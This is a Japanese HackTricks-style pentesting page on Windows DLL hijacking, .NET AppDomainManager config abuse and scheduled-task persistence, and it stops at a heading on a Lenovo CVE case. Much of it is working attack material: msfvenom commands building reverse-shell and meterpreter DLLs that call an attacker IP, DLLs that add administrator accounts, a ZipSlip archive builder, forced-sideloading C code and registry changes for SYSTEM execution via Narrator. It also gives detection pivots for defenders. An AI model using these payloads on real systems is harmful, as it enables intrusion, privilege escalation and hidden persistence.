# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本情報

DLL Hijacking では、信頼されたアプリケーションを操作して、悪意のある DLL をロードさせます。この用語には、**DLL Spoofing、Injection、Side-Loading** など、複数の手法が含まれます。主にコード実行や永続化の実現に利用され、Privilege Escalation に使われることは比較的少ないです。ここでは escalation に焦点を当てていますが、Hijacking の方法自体は目的が異なっても同じです。

### 一般的な手法

DLL Hijacking には複数の方法があり、それぞれの有効性はアプリケーションの DLL ロード戦略によって異なります:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: 正規の DLL を悪意のある DLL に置き換えます。元の DLL の機能を維持するために、DLL Proxying を併用することもあります。
2. **DLL Search Order Hijacking**: アプリケーションの検索パターンを悪用し、正規の DLL よりも先に検索されるパスへ悪意のある DLL を配置します。
3. **Phantom DLL Hijacking**: 存在しない必須 DLL だとアプリケーションに思わせてロードさせるため、悪意のある DLL を作成します。
4. **DLL Redirection**: `%PATH%` や `.exe.manifest` / `.exe.local` ファイルなどの検索パラメータを変更し、アプリケーションを悪意のある DLL へ誘導します。
5. **WinSxS DLL Replacement**: WinSxS ディレクトリ内の正規 DLL を悪意のある DLL に置き換えます。これは DLL side-loading に関連することが多い手法です。
6. **Relative Path DLL Hijacking**: コピーしたアプリケーションとともに、ユーザーが制御可能なディレクトリへ悪意のある DLL を配置します。これは Binary Proxy Execution techniques に類似しています。

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading だけが、信頼された **.NET Framework** プロセスに attacker code をロードさせる方法ではありません。対象の executable が **managed** application の場合、CLR は executable の名前に基づく **application configuration file**（例: `Setup.exe.config`）も参照します。このファイルでは、custom **AppDomainManager** を定義できます。config が EXE の隣に配置された attacker-controlled assembly を指定している場合、CLR は **application's normal code path** より前にそれをロードし、信頼されたプロセス内で実行します。<sup>[[24]](#references)</sup>

Microsoft の .NET Framework configuration schema によると、custom manager を使用するには `<appDomainManagerAssembly>` と `<appDomainManagerType>` の両方が存在している必要があります。<sup>[[16]](#references)[[17]](#references)</sup>

最小構成の config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
最小限のマネージャー:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
実践上の注意:
- これは **.NET Framework 固有**の tradecraft です。Win32 DLL search order ではなく、CLR の設定解析に依存します。
- ホストは実際に **managed EXE** でなければなりません。簡易 triage には、`sigcheck -m target.exe`、`corflags target.exe`、または PE metadata の **CLR Runtime Header** の確認を使用できます。
- config のファイル名は実行ファイル名（`<binary>.config`）と正確に一致する必要があり、通常は **EXE の隣**に配置されます。
- これは **signed Microsoft/vendor binaries** と組み合わせると有用です。信頼された EXE を変更せずに、悪意のある managed assembly を in-process で実行できます。
- すでに書き込み可能な installer/update directory がある場合、AppDomainManager hijacking を **first stage** として使用し、その後の stages で classic DLL sideloading または reflective loading を実行できます。

### AppDomainManager を downloader + scheduled-task bootstrap として使用する

実用的な intrusion pattern では、信頼された managed EXE に、悪意のある `*.config` と、**small bootstrapper** としてのみ動作する悪意のある AppDomainManager DLL の両方を組み合わせます。<sup>[[25]](#references)</sup>

1. ユーザーが、`%USERPROFILE%\Downloads` などのもっともらしい場所から signed .NET installer または updater を起動します。
2. 隣接する config により、正規アプリの logic が開始される **前**に CLR が attacker assembly をロードします。
3. 悪意のある manager が **path gate** を実行します（たとえば、host EXE が `Downloads` から実行されている場合のみ続行し、second stage は `%LOCALAPPDATA%` からのみ実行させます）。
4. チェックに合格すると、`%LOCALAPPDATA%\PerfWatson2.exe` などの user-writable path に real payload を download し、scheduled task によって persistence を確立します。

この variant が重要な理由:
- signed host EXE は変更されないため、main binary の hash のみを確認する triage では compromise を見逃す可能性があります。
- 単純な **path-based anti-analysis** は一般的です。ZIP/EXE/DLL の triad を Desktop、Temp、または sandbox path に移動すると、意図的に chain を破壊できます。
- first-stage AppDomainManager DLL は小さく low-noise のままにでき、real implant は後から fetch できます。

この pattern で頻繁に見られる minimal persistence の例:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
注:
- ` /rl highest` はそのユーザー/セッションで**利用可能な最高権限**を意味します。これだけで SYSTEM への昇格が保証されるわけではありません。
- この手法は、典型的な欠落 DLL の検索順序ハイジャックというより、**.NET config の悪用による実行/永続化**として分類するほうが適切な場合が多くあります。ただし、オペレーターは両方を組み合わせることがよくあります。

Detection pivots:
- **ZIP extraction paths**、`Downloads`、`%TEMP%`、その他のユーザーが書き込み可能なフォルダーから起動された、**colocated** な `<exe>.config` を伴う署名済み .NET 実行ファイル。
- アクションが `%LOCALAPPDATA%`、`%APPDATA%`、または `Downloads` 内を指し、名前がブラウザーやベンダーの updater に似ている新しい scheduled task。
- 別の EXE を直ちにダウンロードし、その後 `schtasks.exe` を起動する短時間だけ実行される managed bootstrap process。
- 実行ファイルのパスが想定されたユーザープロファイルのディレクトリと一致しない限り、早期終了するサンプル。

### 既存の scheduled task をハイジャックして sideload chain を再起動する

永続化では、**新しい task の作成**だけを探してはいけません。一部の intrusion set は、正規の installer が**通常の updater task**を作成するまで待機し、その後 task action を**書き換え**ます。これにより、既存の名前、作成者、trigger は defenders にとって見慣れたままになります。

再利用可能な workflow:
1. 正規の software を install/run し、通常作成される task を特定します。
2. task XML を export し、現在の `<Exec><Command>` / `<Arguments>` の値を記録します。<sup>[[23]](#references)</sup>
3. action のみを置き換え、user-writable な staging directory から**trusted host EXE**を起動するようにします。この EXE が real payload を sideload または AppDomain-load します。
4. 新しい明らかな persistence artifact を作成するのではなく、同じ task name で再登録します。
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
なぜより stealthy なのか:
- task name は依然として正当なものに見せられる（例: vendor updater）。
- **Task Scheduler service** が起動するため、parent/ancestor validation では `explorer.exe` ではなく、期待される scheduling chain が検出されることが多い。
- **new task names** のみを探す DFIR teams は、登録自体は既存だが、action が `%LOCALAPPDATA%`、`%APPDATA%`、またはその他の attacker-controlled path を指すように変更された task を見逃す可能性がある。

Fast hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` の XML と、`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` の metadata を baseline と比較する。
- **vendor-looking updater task** が **user-writable directories** から実行される、または隣接する `*.config` file を持つ .NET EXE を起動する場合に alert を出す。

> [!TIP]
> HTML staging、AES-CTR configs、.NET implants を DLL sideloading の上に重ねる step-by-step chain については、以下の workflow を確認してください。

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Missing Dlls の発見

system 内の missing Dlls を見つける最も一般的な方法は、sysinternals の [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) を起動し、**以下の 2 つの filters を設定する**ことです。

![Common Techniques - Missing Dlls の発見: system 内の missing Dlls を見つける最も一般的な方法は、sysinternals の procmon を起動し、以下の 2 つの filters を設定することです](<../../../images/image (961).png>)

![Common Techniques - Missing Dlls の発見: system 内の missing Dlls を見つける最も一般的な方法は、sysinternals の procmon を起動し、以下の 2 つの filters を設定することです](<../../../images/image (230).png>)

そして **File System Activity** のみを表示します。

![Common Techniques - Missing Dlls の発見: File System Activity のみを表示すること](<../../../images/image (153).png>)

**missing dlls in general** を探している場合は、これを数 **seconds** 実行したままにします。\
**specific executable 内の missing DLL** を探している場合は、**"Process Name" "contains" `<exec name>`** のような別の filter を設定し、対象を実行してから、events の capture を停止します。<sup>[[9]](#references)</sup>

## Missing Dlls の Exploiting

privileges を escalate するには、**privileged process が write 可能な location から load しようとする DLL** を探します。これは、正規の DLL を含む directory よりも先に検索される directory を control している場合、または要求された DLL が存在せず、検索対象の directory のいずれかに write できる場合に発生します。

### Dll Search Order

**[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **では、Dlls が具体的にどのように load されるかを確認できます。**

**Windows applications** は、**pre-defined search paths** に従い、特定の sequence で DLLs を探します。DLL hijacking は、harmful DLL をこれらの directory のいずれかに戦略的に配置し、正規の DLL より先に load されるようにすることで発生します。これを防ぐには、application が必要な DLLs を参照する際に absolute paths を使用するようにします。

以下に **32-bit** systems の **DLL search order** を示します。

1. application が load された directory。
2. system directory。[**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function を使用して、この directory の path を取得します。(_C:\Windows\System32_)
3. 16-bit system directory。この directory の path を取得する function はありませんが、検索されます。(_C:\Windows\System_)
4. Windows directory。[**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function を使用して、この directory の path を取得します。
1. (_C:\Windows_)
5. current directory。
6. PATH environment variable に一覧表示されている directories。これは **App Paths** registry key で指定された per-application path を含まない点に注意してください。DLL search path の計算時に **App Paths** key は使用されません。

これは **SafeDllSearchMode** が enabled の場合の **default** search order です。disabled にすると、current directory が 2 番目に移動します。この feature を disabled にするには、**HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value を作成し、0 に設定します（default は enabled）。

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function が **LOAD_WITH_ALTERED_SEARCH_PATH** とともに call された場合、search は **LoadLibraryEx** が load している executable module の directory から開始されます。

最後に、DLL は name ではなく absolute path で load できます。その場合、Windows は DLL 自体についてその path のみを参照します。ただし、name で要求される dependencies は引き続き該当する search order に従います。

search order を変更するその他の方法もありますが、ここでは説明しません。

### arbitrary file write を missing-DLL hijack に Chaining する

1. **ProcMon** filters（`Process Name` = target EXE、`Path` ends with `.dll`、`Result` = `NAME NOT FOUND`）を使用して、process が probe するものの見つけられない DLL names を収集します。<sup>[[14]](#references)</sup>
2. binary が **schedule/service** 上で実行される場合、それらの names のいずれかを持つ DLL を **application directory**（search-order entry #1）に drop すると、次回の execution 時に load されます。ある .NET scanner の case では、process は `C:\Program Files\dotnet\fxr\...` にある本物の copy を load する前に、`C:\samples\app\` 内の `hostfxr.dll` を探していました。
3. payload DLL（例: reverse shell）を任意の export とともに build します: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`
4. primitive が **ZipSlip-style arbitrary write** の場合、extraction dir から escape する entry を持つ ZIP を作成し、DLL が app folder に配置されるようにします:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. 監視対象の inbox/share に archive を配置します。scheduled task がプロセスを再起動すると、malicious DLL がロードされ、service account としてコードが実行されます。

### RTL_USER_PROCESS_PARAMETERS.DllPath を介した sideloading の強制

新しく作成するプロセスの DLL search path に確実に影響を与える高度な方法は、ntdll の native APIs を使用してプロセスを作成する際に、RTL_USER_PROCESS_PARAMETERS の DllPath field を設定することです。ここに attacker-controlled directory を指定すると、名前で imported DLL を解決する target process（absolute path を使用せず、安全な loading flags も使用しない場合）に対して、その directory から malicious DLL をロードさせることができます。

Key idea
- RtlCreateProcessParametersEx を使用して process parameters を構築し、controlled folder（例：dropper/unpacker が存在する directory）を指す custom DllPath を指定します。
- RtlCreateUserProcess で process を作成します。target binary が名前で DLL を解決すると、loader は解決時に指定された DllPath を参照するため、malicious DLL が target EXE と同じ directory に存在しない場合でも、信頼性の高い sideloading が可能になります。

Notes/limitations
- これは作成される child process に影響します。current process のみに影響する SetDllDirectory とは異なります。
- target は DLL を名前で import または LoadLibrary する必要があります（absolute path を使用せず、LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories も使用しないこと）。
- KnownDLLs と hardcoded absolute paths は hijack できません。Forwarded exports と SxS により優先順位が変わる場合があります。

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: RTL_USER_PROCESS_PARAMETERS.DllPath を介した DLL sideloading の強制</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

実運用での使用例
- 必要な関数を export するか、実際の DLL に proxy する悪意のある xmllite.dll を、DllPath ディレクトリに配置します。
- 上記の technique を使用して、名前で xmllite.dll を lookup することが知られている署名済み binary を起動します。loader は指定された DllPath 経由で import を解決し、DLL を sideload します。

この technique は、実環境で複数段階の sideloading chain を実行するために使用されていることが確認されています。最初の launcher が helper DLL を drop し、その DLL が custom DllPath を指定した Microsoft 署名済みの hijack 可能な binary を起動して、staging directory から attacker の DLL を強制的に load します。<sup>[[6]](#references)</sup>


### `.exe.config` を介した .NET AppDomainManager hijacking

**.NET Framework** の target では、アプリケーションに隣接する **`.exe.config`** ファイルを悪用することで、memory を patch せずに **`Main()`** より前に sideloading を実行できます。Win32 DLL search order のみに依存する代わりに、attacker は正規の .NET EXE を悪意のある config および 1 つ以上の attacker 管理下の assembly と同じ場所に配置します。

chain の動作:<sup>[[15]](#references)[[22]](#references)</sup>
1. host EXE が起動し、**CLR が `<exe>.config` を読み取ります**。
2. config が **`<appDomainManagerAssembly>`** と **`<appDomainManagerType>`** を設定し、runtime が attacker 管理下の `AppDomainManager` を instantiate するようにします。
3. 悪意のある manager が、trusted host process 内で **pre-`Main()` execution** を取得します。
4. 同じ config により、CLR が local assembly（例: `InitInstall.dll`、`Updater.dll`、`uevmonitor.dll`）を先に resolve するよう強制でき、inline patching なしで runtime validation や telemetry を弱体化できます。

Campaign 形式の pattern（directive / CLR version によって正確な nesting は異なる場合があります）:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
これが有用な理由:
- **`<probing privatePath="."/>`** により assembly の解決先がアプリケーションディレクトリ内に限定され、フォルダが予測可能な sideloading の対象になります。<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** により、CLR の初期化中、正規のアプリロジックが実行される前に attacker code へ実行を移せます。<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** により、full-trust アプリが strong-name の検証エラーなしで、署名されていない assembly や改ざんされた assembly を読み込める場合があります。<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** により、新しい assembly への publisher-policy リダイレクトを回避します。<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** により、runtime の選択がより決定的になります。<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** は特に興味深い設定です。implant がメモリ上で `EtwEventWrite` を patch するのではなく、設定から **CLR 自身の ETW による可視性を無効化**するためです。

最近の campaign で見られる運用パターン:
- Stage 1 で `setup.exe`、`setup.exe.config`、およびローカル assembly を配置する。
- Stage 2 でそれらをもっともらしい **AppData update** フォルダへコピーし、host の名前を `update.exe` のようなものに変更して、**scheduled task** 経由で再起動する。
- Stage 3 で、最終的な RAT DLL/export を読み込む前に実行コンテキスト（たとえば Task Scheduler から想定される親プロセス `svchost.exe`）を確認する。

Hunting のアイデア:
- user-writable な場所で、不審な隣接 **`.config`** ファイルとともに実行される、署名済みまたはその他の正規の **.NET executable**。
- **`appDomainManagerAssembly`**、**`appDomainManagerType`**、**`probing privatePath="."`**、**`bypassTrustedAppStrongNames`**、または **`etwEnable enabled="false"`** を含む `.config` ファイル。
- **`%LOCALAPPDATA%`** またはアプリ固有の `\bin\update\` ディレクトリから、名前を変更した update binary を再起動する scheduled task。
- scheduled task が信頼された .NET host を起動し、その host が直ちに自身のディレクトリから vendor 以外の assembly を読み込む、parent/child chain。

#### Windows docs における DLL search order の例外

Windows documentation では、標準 DLL search order に対する特定の例外が示されています。

- **メモリにすでに読み込まれている DLL と同じ名前の DLL** が見つかった場合、system は通常の search を bypass します。代わりに redirection と manifest の確認を行い、その後、メモリ内にすでに存在する DLL を使用します。**このシナリオでは、system は DLL の search を実行しません**。
- DLL が現在の Windows version における **known DLL** として認識されている場合、system は search process を行わず、その known DLL の version と、それが依存する DLL を使用します。これらの known DLL の一覧は、registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** に保持されています。
- **DLL に dependencies がある**場合、これらの dependent DLL の search は、最初の DLL が full path によって特定されたかどうかにかかわらず、依存 DLL が **module name のみで指定された**ものとして実行されます。

### Privileges の Escalation

**Requirements**:

- **DLL が不足している** process のうち、**異なる privileges**（horizontal または lateral movement）で動作している、または動作するものを特定する。
- **DLL** が **search される**すべての **directory** に対して、**write access** が利用可能であることを確認する。この場所は executable の directory、または system path 内の directory である可能性があります。

これらの前提条件は、デフォルトでは一般的ではありません。privileged executable に DLL dependency が不足していることは通常なく、standard user は通常、system search-path directory に書き込めません。ただし、設定ミスのある環境では両方の条件が露呈する可能性があります。\
Requirements を満たしている場合は、[UACME](https://github.com/hfiref0x/UACME) project を確認してください。主な目的は UAC bypass ですが、特定の Windows version 向けの DLL-hijacking PoC が含まれており、発見した writable directory に合わせて適応できることがあります。

次のコマンドを実行して、**folder の permissions を確認**できます:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
また、**PATH 内にあるすべてのフォルダの権限を確認**してください：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
次の方法でも、executable の imports と dll の exports を確認できます：
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
完全な **System Path folder** への書き込み権限を利用した **Dll Hijacking による権限昇格** のガイドについては、以下を確認してください:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 自動化ツール

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) は、system PATH 内の任意のフォルダーに対する書き込み権限があるかを確認します。\
この脆弱性を発見するためのその他の便利な自動化ツールは、**PowerSploit functions** の _Find-ProcessDLLHijack_、_Find-PathDLLHijack_、_Write-HijackDll_ です。

### 例

悪用可能なシナリオを発見した場合、これを正常に exploit するために最も重要なことの1つは、**実行ファイルがそこから import するすべての関数を少なくとも export する dll を作成すること**です。いずれにせよ、Dll Hijacking は、Medium Integrity level から High **(UAC を bypass)** へ[権限昇格](../../authentication-credentials-uac-and-efs/index.html#uac)したり、[ **High Integrity から SYSTEM へ**](../index.html#from-high-integrity-to-system)**権限昇格**したりする際に便利です。**有効な dll の作成方法**の例は、execution のための dll hijacking に焦点を当てた、こちらの dll hijacking study にあります: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**。**\
さらに、**次のセクション**では、**テンプレート**として利用したり、**不要な関数を export する dll**を作成したりする際に役立つ **basic dll codes** を紹介します。

## **DLL の作成とコンパイル**

### **Dll Proxifying**

基本的に **Dll proxy** とは、**ロードされた際に悪意のあるコードを実行**できるだけでなく、**実際のライブラリへのすべての呼び出しを relay することで**、**公開**し、**想定どおりに動作**する Dll です。

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) または [**Spartacus**](https://github.com/Accenture/Spartacus) を使用すると、実際に **実行ファイルを指定して proxify するライブラリを選択し、proxified dll を生成**したり、**Dll を指定して proxified dll を生成**したりできます。

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter を取得：**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**ユーザーを作成（x86版はありますが、x64版は見つけられませんでした）：**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 自作

多くの場合、コンパイルする DLL は、被害プロセスが import する**すべての関数を export**する必要があります。必要な export が欠落していると、バイナリはその関数を解決できず、exploit は失敗します。

<details>
<summary>C DLL テンプレート (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>ユーザー作成を行う C++ DLL の例</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>スレッドエントリを備えた代替 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## ケーススタディ: Narrator OneCore TTS Localization DLL Hijack（Accessibility/ATs）

Windows Narrator.exe は起動時に、予測可能な言語固有の localization DLL を引き続き probe するため、これを hijack して任意の code execution と persistence を実現できます。<sup>[[7]](#references)</sup>

主な事実
- Probe path（現在の build）: `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll`（EN-US）。
- Legacy path（古い build）: `%windir%\System32\speech\engine\tts\msttslocenus.dll`。
- OneCore path に writable な attacker-controlled DLL が存在すると、それが load され、`DllMain(DLL_PROCESS_ATTACH)` が実行されます。export は不要です。

Procmon を使用した Discovery
- Filter: `Process Name is Narrator.exe` および `Operation is Load Image` または `CreateFile`。
- Narrator を起動し、上記 path の load 試行を確認します。

最小 DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSECでの静粛性
- 単純な hijack では、UI上で発話やハイライトが発生します。静かに動作させるには、attach時に Narrator のスレッドを列挙し、メインスレッドを (`OpenThread(THREAD_SUSPEND_RESUME)`) で開いて `SuspendThread` します。その後、自身のスレッドで処理を続行します。完全なコードは PoC を参照してください。<sup>[[8]](#references)</sup>

Accessibility configuration による Trigger と persistence
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 上記の設定により、Narrator の起動時に配置した DLL がロードされます。secure desktop（logon screen）で CTRL+WIN+ENTER を押して Narrator を起動すると、DLL が secure desktop 上で SYSTEM として実行されます。

RDP-triggered SYSTEM execution（lateral movement）
- classic RDP security layer を許可します: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- ホストに RDP 接続し、logon screen で CTRL+WIN+ENTER を押して Narrator を起動します。DLL が secure desktop 上で SYSTEM として実行されます。
- RDP session を閉じると実行が停止するため、速やかに inject/migrate してください。

Bring Your Own Accessibility (BYOA)
- 組み込みの Accessibility Tool (AT) の registry entry（例: CursorIndicator）を clone し、任意の binary/DLL を指すように編集して import した後、`configuration` をその AT 名に設定できます。これにより、Accessibility framework 経由で任意の実行を proxy できます。

Notes
- `%windir%\System32` 配下への書き込みと HKLM の値の変更には admin rights が必要です。
- すべての payload logic は `DLL_PROCESS_ATTACH` に配置できます。exports は不要です。

## Case Study: CVE-2025-1729 - TPQMAssistant.exe を使用した Privilege Escalation

この case では、Lenovo の TrackPoint Quick Menu (`TPQMAssistant.exe`) における **Phantom DLL Hijacking** を説明します。これは **CVE-2025-1729** として追跡されています。<sup>[[2]](#references)[[3]](#references)</sup>

### Vulnerability Details

- **Component**: `C:\ProgramData\Lenovo\TPQM\Assistant\` に配置された `TPQMAssistant.exe`。
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` は、logon user の context で毎日午前9時30分に実行されます。
- **Directory Permissions**: `CREATOR OWNER` による書き込みが可能で、local user は arbitrary file を配置できます。
- **DLL Search Behavior**: 最初に working directory から `hostfxr.dll` の load を試み、見つからない場合に "NAME NOT FOUND" を log に記録します。これは local directory search precedence を示しています。

### Exploit Implementation

